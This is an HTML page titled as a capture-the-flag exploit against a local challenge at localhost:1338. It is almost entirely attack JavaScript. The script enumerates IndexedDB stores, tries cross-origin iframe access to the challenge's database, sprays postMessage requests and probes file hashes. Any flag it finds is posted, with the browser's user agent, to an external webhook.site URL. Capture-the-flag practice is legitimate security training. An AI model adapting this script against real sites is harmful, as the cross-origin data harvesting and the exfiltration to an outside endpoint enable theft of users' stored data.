<!DOCTYPE html>
<html>
<head>
    <title>CTF Exploit - Database Access</title>
</head>
<body>
    <h1>CTF Exploit - Database Access Attack</h1>
    <div id="status">Initializing...</div>
    <div id="output"></div>

    <script>
        const status = document.getElementById('status');
        const output = document.getElementById('output');
        
        function log(msg) {
            console.log(msg);
            status.innerHTML += '<br>' + msg;
        }
        
        function found(flag, method) {
            const flagDiv = document.createElement('div');
            flagDiv.style.cssText = 'color: green; font-size: 24px; border: 3px solid green; padding: 15px; margin: 10px; background: #f0f8f0;';
            flagDiv.innerHTML = `ðŸš© FLAG FOUND via ${method}: <strong>${flag}</strong> ðŸš©`;
            output.appendChild(flagDiv);
            
            // Send to webhook
            fetch('https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df', {
                method: 'POST',
                body: JSON.stringify({
                    flag: flag,
                    method: method,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                }),
                headers: {'Content-Type': 'application/json'}
            }).then(() => log('Flag sent to webhook!')).catch(e => log('Webhook failed: ' + e));
        }
        
        // Strategy 1: Navigate back to challenge page to access its database
        function accessChallengeDatabase() {
            log('Attempting to access challenge page database...');
            
            // Create an iframe to the challenge page
            const iframe = document.createElement('iframe');
            iframe.src = 'http://localhost:1338';
            iframe.style.width = '100%';
            iframe.style.height = '500px';
            iframe.style.border = '2px solid red';
            iframe.id = 'challengeFrame';
            
            iframe.onload = function() {
                log('Challenge iframe loaded');
                
                // Try to access the iframe's database
                setTimeout(() => {
                    try {
                        const iframeWindow = iframe.contentWindow;
                        const iframeDocument = iframe.contentDocument;
                        
                        log('Attempting to access iframe database...');
                        
                        // Try to call the database functions
                        if (iframeWindow.DB) {
                            log('Found DB class in iframe!');
                            const db = new iframeWindow.DB();
                            
                            db.getFiles().then(files => {
                                log(`Found ${files.length} files in database`);
                                
                                files.forEach(async (fileInfo, index) => {
                                    log(`File ${index}: ${fileInfo.file.name}, public: ${fileInfo.isPublic}`);
                                    
                                    if (fileInfo.isPublic && fileInfo.file.name === 'flag.txt') {
                                        const flagContent = await fileInfo.file.text();
                                        found(flagContent, 'iframe_database');
                                    }
                                });
                            }).catch(e => log('Database access failed: ' + e));
                        }
                        
                    } catch (e) {
                        log('Cannot access iframe database (expected): ' + e.message);
                    }
                }, 2000);
            };
            
            document.body.appendChild(iframe);
        }
        
        // Strategy 2: Check if we can access IndexedDB directly
        function checkIndexedDB() {
            log('Checking IndexedDB for challenge data...');
            
            // Try to open IndexedDB databases that might contain the flag
            const dbNames = ['postviewer', 'files', 'challenge', 'fileDB'];
            
            dbNames.forEach(dbName => {
                try {
                    const request = indexedDB.open(dbName);
                    
                    request.onsuccess = function(event) {
                        const db = event.target.result;
                        log(`Opened database: ${dbName}`);
                        
                        // Get all object stores
                        const objectStoreNames = db.objectStoreNames;
                        log(`Object stores in ${dbName}: ${Array.from(objectStoreNames).join(', ')}`);
                        
                        // Try to read from each object store
                        for (let i = 0; i < objectStoreNames.length; i++) {
                            const storeName = objectStoreNames[i];
                            
                            try {
                                const transaction = db.transaction([storeName], 'readonly');
                                const objectStore = transaction.objectStore(storeName);
                                const getAllRequest = objectStore.getAll();
                                
                                getAllRequest.onsuccess = function() {
                                    const results = getAllRequest.result;
                                    log(`Found ${results.length} items in ${dbName}.${storeName}`);
                                    
                                    results.forEach((item, index) => {
                                        log(`Item ${index} in ${storeName}: ${JSON.stringify(item).substring(0, 100)}...`);
                                        
                                        // Check if this item contains a flag
                                        const itemStr = JSON.stringify(item);
                                        if (itemStr.includes('CTF{') || itemStr.includes('flag.txt')) {
                                            log('Potential flag found in database item!');
                                            
                                            // Try to extract flag
                                            const flagMatch = itemStr.match(/CTF\{[^}]+\}/);
                                            if (flagMatch) {
                                                found(flagMatch[0], 'indexeddb_direct');
                                            }
                                            
                                            // If it's a file object, try to read it
                                            if (item.file && item.file.name === 'flag.txt') {
                                                item.file.text().then(content => {
                                                    found(content, 'indexeddb_file');
                                                }).catch(e => log('Could not read file: ' + e));
                                            }
                                        }
                                    });
                                };
                            } catch (e) {
                                log(`Error accessing ${storeName}: ${e.message}`);
                            }
                        }
                    };
                    
                    request.onerror = function() {
                        log(`Database ${dbName} not found or inaccessible`);
                    };
                    
                } catch (e) {
                    log(`Error opening database ${dbName}: ${e.message}`);
                }
            });
        }
        
        // Strategy 3: Listen for postMessage and try to trigger flag sharing
        window.addEventListener('message', function(event) {
            log(`Received message from ${event.origin}: ${JSON.stringify(event.data)}`);
            
            if (event.data && event.data.type === 'share' && event.data.files) {
                log('Received file sharing message!');
                
                event.data.files.forEach(async (fileData, index) => {
                    log(`Processing shared file ${index}: ${fileData.name}`);
                    
                    if (fileData.name === 'flag.txt' && fileData.blob) {
                        const flagContent = await fileData.blob.text();
                        found(flagContent, 'postmessage');
                    }
                });
            }
        });
        
        // Strategy 4: Try to force the challenge page to re-share the flag
        function triggerFlagSharing() {
            log('Attempting to trigger flag sharing...');
            
            // Try different ways to trigger the flag sharing
            const messages = [
                {type: 'request_share'},
                {type: 'get_files'},
                {type: 'reload'},
                {action: 'share_flag'},
                {command: 'get_flag'}
            ];
            
            messages.forEach(msg => {
                window.postMessage(msg, '*');
                
                // Also try to send to iframe if it exists
                const iframe = document.getElementById('challengeFrame');
                if (iframe && iframe.contentWindow) {
                    try {
                        iframe.contentWindow.postMessage(msg, '*');
                    } catch (e) {
                        // Expected to fail
                    }
                }
            });
        }
        
        // Strategy 5: Try to navigate to the challenge page with the flag hash
        function tryDirectNavigation() {
            log('Attempting direct navigation to challenge page...');
            
            // Try common flag file IDs
            const possibleHashes = [
                '#file-1', '#file-0', '#file-flag', '#file-admin',
                '#0', '#1', '#2', '#3'
            ];
            
            possibleHashes.forEach(hash => {
                log(`Trying navigation to http://localhost:1338${hash}`);
                
                const testFrame = document.createElement('iframe');
                testFrame.src = `http://localhost:1338${hash}`;
                testFrame.style.width = '300px';
                testFrame.style.height = '200px';
                testFrame.style.border = '1px solid blue';
                testFrame.style.display = 'none';
                
                testFrame.onload = () => {
                    log(`Loaded ${hash}`);
                    // Remove after a short time
                    setTimeout(() => testFrame.remove(), 3000);
                };
                
                document.body.appendChild(testFrame);
            });
        }
        
        // Execute all strategies
        log('Starting multi-strategy exploitation...');
        
        // Start with database checks
        checkIndexedDB();
        
        // Then try iframe access
        setTimeout(accessChallengeDatabase, 1000);
        
        // Try to trigger flag sharing
        setTimeout(triggerFlagSharing, 2000);
        
        // Try direct navigation
        setTimeout(tryDirectNavigation, 3000);
        
        // Keep monitoring
        setInterval(() => {
            log('Still monitoring for flags...');
        }, 10000);
        
        log('All strategies started. Monitoring for flags...');
    </script>
</body>
</html>
